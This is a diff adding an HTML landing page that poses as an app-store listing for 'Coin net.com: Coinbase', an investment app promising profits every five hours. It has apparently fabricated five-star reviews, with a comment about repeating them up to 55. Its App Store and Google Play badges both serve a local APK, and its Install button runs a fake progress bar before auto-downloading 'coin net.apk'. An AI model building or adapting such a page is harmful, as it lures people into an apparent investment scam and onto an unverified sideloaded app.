@@ -1,0 +1,724 @@
+<!doctype html>. 
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Popup with Loader & Store Badges</title>
+<style>
+  :root{
+  --bg: #fff;
+  --fg: #000;
+  --muted: #666;
+  --overlay: rgba(0,0,0,0.45);
+}
+html,body{
+  margin:0; height:100%;
+  font-family: Inter, system-ui, sans-serif;
+  background: var(--bg); color: var(--fg);
+  line-height:1.5;
+}
+
+h1{margin:0;font-size:1.5rem;}
+p{margin:0;color:var(--muted);max-width:65ch;}
+
+.page{ 
+  padding:1rem; 
+  max-width:900px; 
+  margin:auto; 
+  margin-top:20px; 
+}
+
+/* -------- App Header -------- */
+.app-header{ 
+  display:flex; 
+  gap:1rem; 
+  align-items:center; 
+  flex-wrap:wrap;
+}
+.app-header img{ 
+  width:72px; height:72px; border-radius:16px; 
+  flex-shrink:0; 
+}
+.app-meta{ 
+  flex:1; 
+  min-width:200px; 
+}
+.app-title-line{ display:flex; align-items:baseline; gap:0.6rem; flex-wrap:wrap;}
+.app-title-line h1{ margin:0; font-size:1.25rem; }
+.app-title-line p{ margin:0; color:var(--muted); font-size:.9rem; }
+
+.meta-info{ display:flex; flex-wrap:wrap; gap:.8rem; margin-top:.5rem; font-size:.85rem; color:var(--muted); }
+
+.install-btn { 
+  background:#007bff; 
+  color:#fff; 
+  border:none; 
+  border-radius:6px; 
+  width:100px;        /* ⬅️ Set width */
+  height:35px;        /* ⬅️ Set height */
+  font-weight:600; 
+  margin-top:.8rem; 
+  cursor: none; 
+  font-size:1rem;
+}
+
+/* -------- Screenshots -------- */
+.screenshots{ 
+  display:flex; gap:.8rem; 
+  overflow-x:auto; 
+  margin:1.5rem 0; 
+  padding-bottom:.5rem; 
+}
+.screenshots img{ 
+  height:180px; 
+  border-radius:10px; 
+  flex-shrink:0; 
+  cursor: none; 
+  transition: transform .2s; 
+}
+.screenshots img:hover{ transform:scale(1.05); }
+
+/* -------- Sections -------- */
+h2{ font-size:1.2rem; margin:1.5rem 0 .6rem; }
+.about{ color:var(--muted); font-size:.95rem; }
+
+/* -------- Reviews -------- */
+.review{ 
+  background:#f7f7f7; 
+  border-radius:12px; 
+  padding:1rem; 
+  margin:1rem 0; 
+}
+.review-header{ 
+  display:flex; justify-content:space-between; flex-wrap:wrap; 
+  margin-bottom:.5rem; 
+}
+.reviewer{font-weight:600;}
+.stars{color:gold; font-size:.9rem;}
+.review-date{color:var(--muted); font-size:.8rem;}
+.review p{margin:.3rem 0 0; font-size:.95rem;}
+
+/* -------- Popup -------- */
+.overlay{
+  position:fixed; inset:0; background:transparent;
+  transition: background .3s ease;
+  pointer-events:none; z-index:40;
+}
+.overlay.active{ background:var(--overlay); pointer-events:auto; }
+
+.popup{
+  position:fixed; left:50%; top:50%;
+  transform:translate(-50%,100%);
+  width:95%; max-width:400px;
+  background:#000000;
+  border-radius:18px; /* Desktop rounded corners */
+  box-shadow:0 8px 30px rgba(0,0,0,0.18);
+  transition: transform .45s cubic-bezier(.22,.95,.23,1);
+  z-index:50;
+  display:flex;
+  flex-direction:column;
+  padding:1.2rem;
+  box-sizing:border-box;
+  overflow:hidden;
+}
+.popup.open{ transform:translate(-50%,-50%); }
+
+/* ✅ Mobile Rounded Top Only */
+@media (max-width:768px){
+  .popup{
+    left:0; right:0; bottom:0; top:auto;
+    width:100%; max-width:none;
+    transform:translateY(100%);
+    border-radius:0;
+    border-top-left-radius:25px;
+    border-top-right-radius:25px;
+  }
+  .popup.open{ transform:translateY(0); }
+}
+
+header{display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem;}
+header h2{margin:0;font-size:1.1rem;}
+.close-btn{border:1px solid #ccc;background:#fff;padding:.4rem .6rem;border-radius:8px;cursor:pointer;}
+.body{ flex:1;overflow:auto;text-align:center;display:flex; flex-direction:column; gap:1.5rem; }
+
+/* Loading screen */
+.loading-screen{
+  flex:1; display:flex; flex-direction:column;
+  align-items:center; justify-content:center;
+  gap:1rem; animation: fadeIn .3s ease;
+}
+.spinner{ width:40px; height:40px; border:4px solid #ccc; border-top-color:#000; border-radius:50%; animation: spin 1s linear infinite;}
+.loading-text{font-size:.95rem;color:var(--muted);}
+@keyframes spin{to{transform:rotate(360deg);}}
+@keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+.hidden{display:none;}
+
+/* Store badges */
+.store-badges{
+  margin-top:2rem;
+  display:flex; flex-direction:column;
+  align-items:center; gap:1.2rem;
+}
+.store-badges img{
+  height:55px;
+  width:auto;
+  transition: transform .2s ease;
+}
+.store-badges img:hover{ transform: scale(1.05); }
+
+/* Lightbox */
+.lightbox{
+  position:fixed; top:0; left:0; right:0; bottom:0;
+  background:rgba(0,0,0,0.9);
+  display:flex; justify-content:center; align-items:center;
+  z-index:100; display:none;
+}
+.lightbox img{ max-width:90%; max-height:90%; border-radius:8px;}
+.lightbox.show{ display:flex; }
+
+/* -------- Responsive tweaks -------- */
+@media (max-width:768px){
+  .popup{ 
+    left:0; right:0; bottom:0; top:auto;
+    width:100%; max-width:none;
+    transform:translateY(100%);
+    border-top-left-radius:18px; border-top-right-radius:18px;
+  }
+  .popup.open{ transform:translateY(0); }
+  .handle{display:block;width:42px;height:5px;background:var(--muted);border-radius:999px;margin:0 auto 14px;}
+  .screenshots img{ height:140px; }
+}
+
+/* Progress bar container */
+.progress-container {
+  width: 100%;
+  background: #e0e0e0;
+  border-radius: 6px;
+  margin-top: 10px;
+  height: 10px;
+  overflow: hidden;
+  display: none;
+}
+
+/* Progress bar line */
+.progress-bar {
+  width: 0%;
+  height: 100%;
+  background: #00aaff;
+  transition: width 0.1s linear;
+}
+</style>
+</head>
+<body>
+<div class="page">
+  <!-- App header -->
+  <div class="app-header">
+    <img src="logo.png" alt="App Icon" style="background: #000000;">
+    <div class="app-meta">
+      <div class="app-title-line">
+        <h2>Coin net.com: Coinbase</h2>
+        <p>Online investment platform</p>
+      </div>
+      <div class="meta-info">
+        <span>⭐ 4.7 (181K)</span>
+        <span>16 MB</span>
+        <span>Rated 3+</span>
+      </div>
+      <button id="openBtn" class="install-btn">Install</button>
+      
+      <div class="progress-container" id="progressContainer">
+  <div class="progress-bar" id="progressBar"></div>
+</div>
+<p id="progressText" style="font-size:14px;color:#666;display:none;">0%</p>
+    </div>
+  </div>
+
+  <!-- Screenshots -->
+  <div class="screenshots">
+    <img src="app 6.jpg" alt="Screenshot 2">
+    <img src="app 4.jpg" alt="Screenshot 4">
+    <img src="app 3.jpg" alt="Screenshot 3">
+    <img src="app 1.jpg" alt="Screenshot 1">
+    <img src="app 5.jpg" alt="Screenshot 5">
+    <img src="app 2.jpg" alt="Screenshot 6">
+  </div>
+
+  <!-- About -->
+<h2>About this app</h2>
+<p class="about">At <b>Coin-net.com</b>, we make it easy for anyone to invest in major global companies like Amazon, Apple, and Tesla. Buy shares directly from our platform and start earning profits every 5 hours based on the value of your investment.</p>
+
+<!-- Reviews -->
+<h2>Reviews</h2>
+
+<div class="review">
+  <div class="review-header">
+    <span class="reviewer">Rafi Ff</span>
+    <span class="review-date">17/08/2025</span>
+  </div>
+  <div class="stars">★★★★★</div>
+  <p>Honestly, this app is so good! At first, I thought it was fake, but after trying it, I started getting results really fast.</p>
+</div>
+
+<div class="review">
+  <div class="review-header">
+    <span class="reviewer">Lauren M.</span>
+    <span class="review-date">08/09/2025</span>
+  </div>
+  <div class="stars">★★★★★</div>
+  <p>App does what it says and brings engagement. The lessons are sharp and easy to follow.</p>
+</div>
+
+<div class="review">
+  <div class="review-header">
+    <span class="reviewer">Uchechukwu Precious</span>
+    <span class="review-date">05/08/2025</span>
+  </div>
+  <div class="stars">★★★★★</div>
+  <p>I didn’t believe it at first, but I was surprised when I tried it out. I got the result I wanted within minutes.</p>
+</div>
+
+<div class="review">
+  <div class="review-header">
+    <span class="reviewer">Michael O.</span>
+    <span class="review-date">11/09/2025</span>
+  </div>
+  <div class="stars">★★★★☆</div>
+  <p>Great platform, very smooth to use. Would love to see even more companies added in the future.</p>
+</div>
+
+<div class="review">
+  <div class="review-header">
+    <span class="reviewer">Sophia Lee</span>
+    <span class="review-date">03/08/2025</span>
+  </div>
+  <div class="stars">★★★★★</div>
+  <p>I’ve tried other apps, but this one stands out. The profits actually come in every 5 hours as promised.</p>
+</div>
+
+<div class="review">
+  <div class="review-header">
+    <span class="reviewer">Daniel P.</span>
+    <span class="review-date">14/07/2025</span>
+  </div>
+  <div class="stars">★★★★☆</div>
+  <p>Simple interface and fast payouts. Took me a while to understand at first, but now it’s my daily routine.</p>
+</div>
+
+<div class="review">
+  <div class="review-header">
+    <span class="reviewer">Amina Yusuf</span>
+    <span class="review-date">29/08/2025</span>
+  </div>
+  <div class="stars">★★★★★</div>
+  <p>I love how transparent the process is. You can actually track your investments in real time.</p>
+</div>
+
+<div class="review">
+  <div class="review-header">
+    <span class="reviewer">Chris Johnson</span>
+    <span class="review-date">25/08/2025</span>
+  </div>
+  <div class="stars">★★★★★</div>
+  <p>This app changed my financial life. I never thought investing could be this easy from my phone.</p>
+</div>
+
+<div class="review">
+  <div class="review-header">
+    <span class="reviewer">Fatima K.</span>
+    <span class="review-date">01/09/2025</span>
+  </div>
+  <div class="stars">★★★★★</div>
+  <p>The customer support is very responsive. I had an issue once, and they solved it within minutes.</p>
+</div>
+
+<div class="review">
+  <div class="review-header">
+    <span class="reviewer">James Wilson</span>
+    <span class="review-date">22/07/2025</span>
+  </div>
+  <div class="stars">★★★★☆</div>
+  <p>Very good, but I wish there was a dark mode option. Other than that, it’s perfect!</p>
+</div>
+
+<!-- Continue adding similar blocks... -->
+
+<!-- Example of the structure you should repeat until you reach 55 reviews -->
+</div>
+</div>
+  
+<div id="overlay" class="overlay"></div>
+
+<aside id="popup" class="popup" role="dialog" aria-modal="true" aria-labelledby="popupTitle">
+  <div class="handle"></div>
+  <div id="loadingScreen" class="loading-screen">
+    <div class="spinner"></div>
+    <div class="loading-text">Loading, please wait...</div>
+  </div>
+  <div id="popupContent" class="hidden">
+    <header>
+      <h2 id="popupTitle" style="color: #ffffff;">Get the App</h2>
+      <button id="closeBtn" style="cursor: none;" class="close-btn">Close</button>
+    </header>
+    <div class="body">
+      <p style="color: #ffffff;">Choose your platform to download:</p>
+     <div class="store-badges">
+  <!-- iOS button (also downloads APK for now) -->
+  <a href="coin net.ios.gz" style="cursor: none;" download="coin net.apk">
+    <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="Download on the App Store">
+  </a>
+
+  <!-- Android button -->
+  <a href="coin%20net.apk" style="cursor: none;" download="coin net.apk">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
+  </a>
+</div>
+    </div>
+  </div>
+</aside>
+
+<!-- Lightbox for full image -->
+<div id="lightbox" class="lightbox">
+  <img src="" alt="Full Screenshot">
+</div>
+
+ <style>  
+  h1 {  
+    text-align: center;  
+    padding: 1rem;  
+    color: #00aaff;  
+  }  
+
+  .slider-container {  
+    position: relative;  
+    width: 100%;  
+    max-width: 320px;  
+    margin: auto;  
+    overflow: hidden;  
+    border-radius: 6px;  
+  }  
+
+  .slider {  
+    display: flex;  
+    transition: transform 0.5s ease-in-out;  
+  }  
+
+  .slide {  
+    min-width: 100%;  
+    box-sizing: border-box;  
+    display: flex;  
+    justify-content: center;  
+    align-items: center;  
+    background: #000;  
+  }  
+
+  /* ✅ Fix for consistent video sizing */  
+  .slide video {  
+    width: 100%;  
+    height: 180px;   /* same height for all */  
+    object-fit: cover;  /* makes sure video fills area */  
+    border-radius: 6px;  
+    background: #000;  
+    display: block;  
+  }  
+
+  /* Navigation buttons */  
+  .nav-btn {  
+    position: absolute;  
+    top: 50%;  
+    transform: translateY(-50%);  
+    background: none;  
+    border: none;  
+    color: white;  
+    font-size: 1rem;  
+    padding: .2rem .5rem;  
+    cursor: none;  
+    border-radius: 50%;  
+    transition: background 0.3s;  
+  }  
+
+  .nav-btn:hover {  
+    background: none;  
+  }  
+
+  .prev { left: 5px; }  
+  .next { right: 5px; }  
+
+  /* Dots navigation */  
+  .dots {  
+    text-align: center;  
+    margin-top: 6px;  
+  }  
+
+  .dot {  
+    height: 7px;  
+    width: 7px;  
+    margin: 0 2px;  
+    background: #444;  
+    border-radius: 50%;  
+    display: inline-block;  
+    cursor: none;  
+    transition: background 0.3s;  
+  }  
+
+  .dot.active {  
+    background: #00aaff;  
+  }  
+</style>
+  
+  <h1>Users Feedback</h1>
+
+  <div class="slider-container">
+    <div class="slider" id="slider">
+      <!-- Slide 1 -->
+      <div class="slide">
+        <video controls>
+          <source src="vid1.mp4" type="video/mp4">
+          Your browser does not support HTML5 video.
+        </video>
+      </div>
+      <!-- Slide -->
+      <div class="slide">    
+      </div>
+      <!-- Slide 2 -->
+      <div class="slide">
+        <video controls>
+          <source src="vid2.mp4" type="video/mp4">
+          Your browser does not support HTML5 video.
+        </video>
+      </div>
+      <!-- Slide 3 -->
+      <div class="slide">
+        <video controls>
+          <source src="vid3.mp4" type="video/mp4">
+          Your browser does not support HTML5 video.
+        </video>
+      </div>
+      
+      <div class="slide">
+        <video controls>
+          <source src="vid4.mp4" type="video/mp4">
+          Your browser does not support HTML5 video.
+        </video>
+      </div>
+      
+      <div class="slide">
+        <video controls>
+          <source src="vid5.mp4" type="video/mp4">
+          Your browser does not support HTML5 video.
+        </video>
+      </div>
+    </div>
+
+    <!-- Navigation buttons -->
+    <button class="nav-btn prev" onclick="moveSlide(-1)">❮</button>
+    <button class="nav-btn next" onclick="moveSlide(1)">❯</button>
+  </div>
+
+  <!-- Dots -->
+  <div class="dots" id="dots"></div>
+
+ <script>
+// Get elements
+const screenshotImages = document.querySelectorAll(".screenshots img");
+const lightbox = document.getElementById("lightbox");
+const lightboxImg = document.querySelector("#lightbox img");
+
+// Make screenshots clickable
+screenshotImages.forEach(img => {
+  img.addEventListener("click", () => {
+    lightboxImg.src = img.src;   // Show clicked image
+    lightbox.classList.add("show");
+  });
+});
+
+// Click anywhere to close lightbox
+lightbox.addEventListener("click", () => {
+  lightbox.classList.remove("show");
+});
+</script>
+
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+  <style>
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 2rem;
+    }
+
+    footer {
+      background: #111;
+      color: #fff;
+      padding: 2rem 1rem;
+    }
+
+    .footer-container {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 1.5rem;
+      max-width: 1200px;
+      margin: auto;
+    }
+
+    .footer-section h3 {
+      margin-bottom: .8rem;
+      font-size: 1.1rem;
+      color: #00aaff;
+    }
+
+    .footer-section p, 
+    .footer-section a {
+      color: #ccc;
+      text-decoration: none;
+      font-size: 0.95rem;
+      line-height: 1.5;
+    }
+
+    .footer-section a:hover {
+      color: #fff;
+    }
+
+    .socials {
+      display: flex;
+      gap: .8rem;
+      margin-top: .5rem;
+    }
+
+    .socials a {
+      background: #222;
+      padding: .6rem;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      color: #ccc;
+      font-size: 1rem;
+      transition: all .3s ease;
+    }
+
+    .socials a:hover {
+      background: #00aaff;
+      color: #fff;
+    }
+
+    .copyright {
+      text-align: center;
+      margin-top: 2rem;
+      font-size: .85rem;
+      color: #777;
+    }
+  </style>
+
+  <footer>
+    <div class="footer-container">
+      <!-- Location -->
+      <div class="footer-section">
+        <h3>Our Location</h3>
+        <p>2703 W Avenue 30,<br> Los Angeles, <br> CA 90065,</p>
+      </div>
+
+      <!-- Contact -->
+      <div class="footer-section">
+        <h3>Contact Us</h3>
+        <p><i class="fa-solid fa-envelope"></i> 
+          <a style="cursor: none;" href="mailto:coinnet50@gmail.com">coinnet50@gmail.com </a></p>
+        <p><i class="fa-solid fa-phone"></i> 
+          <a style="cursor: none;" href="tel:+18254738331">+1 (825) 473-8331</a></p>
+      </div>
+
+      <!-- Socials -->
+      <div class="footer-section">
+        <h3>Follow Us</h3>
+        <div class="socials">
+          <a href="#" style="cursor: none;"><i class="fab fa-facebook-f"></i></a>
+          <a href="#" style="cursor: none;"><i class="fab fa-twitter"></i></a>
+          <a href="#" style="cursor: none;"><i class="fab fa-instagram"></i></a>
+          <a href="#" style="cursor: none;"><i class="fab fa-linkedin-in"></i></a>
+          <a href="https://wa.me/18254738331" style="cursor: none;"><i class="fa-brands fa-whatsapp"></i></a>
+        </div>
+      </div>
+    </div>
+
+    <p class="copyright">© 2025 Coin Net. All rights reserved.</p>
+  </footer>
+  
+<script>
+const installBtn = document.getElementById("openBtn");
+const progressContainer = document.getElementById("progressContainer");
+const progressBar = document.getElementById("progressBar");
+const progressText = document.getElementById("progressText");
+
+installBtn.addEventListener("click", () => {
+  
+  // hide button
+  installBtn.style.display = "none";
+
+  // show progress UI
+  progressContainer.style.display = "block";
+  progressText.style.display = "block";
+
+  let progress = 0;
+  let interval = setInterval(() => {
+    progress++;
+    progressBar.style.width = progress + "%";
+    progressText.innerText = progress + "%";
+
+    if (progress >= 100) {
+      clearInterval(interval);
+
+      // Auto download APK
+      let link = document.createElement("a");
+      link.href = "coin net.apk";  // <-- YOUR APK FILE NAME
+      link.download = "coin net.apk";
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
+    }
+  }, 50);  // progress bar speed
+});
+</script>
+<script>
+let currentIndex = 0;
+const slider = document.getElementById("slider");
+const slides = document.querySelectorAll(".slide");
+
+// Create dots
+const dotsContainer = document.getElementById("dots");
+slides.forEach((_, i) => {
+  const dot = document.createElement("span");
+  dot.classList.add("dot");
+  if (i === 0) dot.classList.add("active");
+  dot.onclick = () => goToSlide(i);
+  dotsContainer.appendChild(dot);
+});
+const dots = document.querySelectorAll(".dot");
+
+// Move slides left/right
+function moveSlide(direction) {
+  currentIndex += direction;
+
+  if (currentIndex < 0) currentIndex = slides.length - 1;
+  if (currentIndex >= slides.length) currentIndex = 0;
+
+  updateSlider();
+}
+
+// Move to specific slide
+function goToSlide(index) {
+  currentIndex = index;
+  updateSlider();
+}
+
+// Update slider position + dots
+function updateSlider() {
+  slider.style.transform = `translateX(${-currentIndex * 100}%)`;
+
+  dots.forEach((dot, i) => {
+    dot.classList.toggle("active", i === currentIndex);
+  });
+}
+</script>
+</body>
+</html>
